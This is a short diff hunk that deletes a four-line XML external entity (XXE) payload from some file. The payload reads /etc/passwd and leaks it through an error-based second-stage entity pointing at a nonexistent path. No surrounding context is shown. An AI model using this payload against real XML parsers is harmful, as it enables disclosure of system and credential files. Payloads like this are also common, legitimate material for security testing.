@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % secondstage "<!ENTITY disclose SYSTEM 'file:///nonexistent/%file;'>">
-%secondstage;
-%disclose;
